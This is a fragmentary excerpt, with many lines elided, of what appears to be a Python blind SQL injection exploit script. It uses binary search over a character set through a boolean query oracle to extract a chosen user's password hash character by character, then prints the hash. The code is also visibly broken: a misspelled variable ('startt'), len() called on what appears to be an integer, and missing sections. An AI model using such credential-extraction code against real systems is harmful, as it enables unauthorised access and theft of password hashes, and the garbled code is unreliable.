...
if len(sys.argv) != 3:
    ...
    def extract_hash_bs(charset, user_id , password_len):
        found=""
        for index in range(0,len(password_len)):
            start=0
            end=len(charset)-1
            while start <= end:
                if end - start == 1:
                    if startt == 0 and boolean_query(index,user_id,charset[start]):
                        found += charset[start]
                    else:
    ...
    while True:
        try:
            ...
            if not invalid_user(user_id):
                ...
                total_queries_taken()
                pr("\t [-] User {} hash: {} ".format(user_id,extract_hash_bs(charset,int(user_id),user_pass_length)))
                total_queries_taken()
            else:
